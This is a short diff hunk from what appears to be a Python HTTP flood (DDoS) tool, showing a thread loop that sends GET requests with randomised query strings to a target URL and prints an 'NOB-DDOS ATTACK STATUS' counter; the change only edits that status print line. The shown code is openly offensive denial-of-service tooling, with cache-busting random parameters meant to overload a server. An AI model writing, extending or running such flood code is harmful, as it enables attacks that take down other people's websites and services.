@@ -85,7 +85,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("\033[33m[\033[97m+\033[92m]\033[92mSENDING MASSAGE: " +str()+ " \033[32mNOB-DDOS ATTACK STATUS " +str()+ " \033[1m" +ip+ "\033[0m".format(count))
+                print ("\033[33m[\033[97m+\033[92m]\033[92mSENDING MASSAGE: " +str(u)+ " \033[32mNOB-DDOS ATTACK STATUS " +str()+ " \033[1m" +url+ "\033[0m".format(count))
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
